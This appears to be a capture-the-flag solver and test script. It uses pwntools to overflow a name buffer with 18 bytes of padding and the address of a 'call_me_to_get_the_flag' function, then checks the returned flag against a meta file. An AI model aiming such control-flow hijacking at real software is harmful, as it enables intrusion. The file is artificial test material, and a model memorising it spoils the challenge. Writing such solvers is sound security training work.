import os
import yaml
import logging
from pwn import *
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


# For local binary testing
def solve(p):
    binary = ELF(str(HERE / "src/chal"))
    p.sendlineafter(b"Hello, what is your name?", b"a"*18+p32(binary.sym['call_me_to_get_the_flag']))
    flag = p.recvuntil(b"}\n").split(b":")[-1].decode() # Don't @ me!
    assert FLAG in flag, flag


### IF BINARY ###
def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    test("localhost", 32000)
    # sh = process("./chal", cwd=f"{os.getcwd()}/src")
    # solve(sh)
